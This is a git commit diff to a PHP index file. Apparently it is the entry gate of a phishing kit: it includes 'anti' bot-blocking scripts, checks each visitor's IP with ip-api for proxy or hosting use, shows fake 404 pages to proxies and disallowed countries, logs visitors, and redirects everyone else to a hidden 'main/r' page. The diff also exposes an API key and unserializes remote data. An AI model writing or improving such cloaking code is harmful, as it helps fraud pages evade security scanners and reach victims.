512bb9c115d1801212c41f092ef82ede75fd46df
escobar25250616 <jeanherman001@gmail.com>
2025-07-02 19:00:44 +0200

    fix redirection logique

--- index.php
+++ index.php
@@ -1,5 +1,4 @@
 <?php
-
     include 'prevents/anti1.php';
     include 'prevents/anti2.php';
     include 'prevents/anti3.php';
@@ -21,29 +20,26 @@
     function visitors($detection) {
         GLOBAL $ip_infos;
         $Browser = new foroco\BrowserDetection();
-        $result = $Browser->getAll($useragent, 'JSON');
-        $ip              = $ip_infos['query'];
-        $date            = date("Y-m-d H:i:s", time());
         $useragent       = $_SERVER['HTTP_USER_AGENT'];
         $result          = $Browser->getAll($useragent, 'JSON');
         $result          = json_decode($result,true);
+        $ip              = $ip_infos['query'];
+        $date            = date("Y-m-d H:i:s", time());
         $os_type         = $result['os_type'];
         $os_name         = $result['os_name'];
         $device_type     = $result['device_type'];
         $browser_name    = $result['browser_name'];
         $browser_version = $result['browser_version'];
-        $browser_version = $result['browser_version'];
         $country         = $ip_infos['country'];
 
         $str = " <tr><th scope='row'>$ip ($country)</th><td>$date</td><td>$detection</td><td>[$device_type] $browser_name $browser_version</td></tr>";
-        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
+        file_put_contents('visitors.html', $str, FILE_APPEND | LOCK_EX);
     }
 
     $ip = $_SERVER['REMOTE_ADDR'];
     $ip_infos = file_get_contents("https://pro.ip-api.com/php/". $ip ."?key=I8h97HB1QkUVKV0&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
     $ip_infos = unserialize($ip_infos);
 
-    
     if( $ip_infos['status'] == "success" ) {
 
         if( $ip_infos['proxy'] == true ) {
@@ -52,20 +48,18 @@
             exit();
         }
 
-        if( count($allowed_countries) > 0 ) {
-            if( !in_array($ip_infos['countryCode'],$allowed_countries) ) {
-                visitors("Country not allowed");
-                header('HTTP/1.0 404 Not Found');
-                exit();
-            }
+        if( count($allowed_countries) > 0 && !in_array($ip_infos['countryCode'],$allowed_countries) ) {
+            visitors("Country not allowed");
+            header('HTTP/1.0 404 Not Found');
+            exit();
         }
+
         visitors("Allowed");
-        header("Location: main/r");
+        header("Location: main/r/index.php");
         exit();
 
     } else {
         header('HTTP/1.0 404 Not Found');
         exit();
     }
-
 ?>
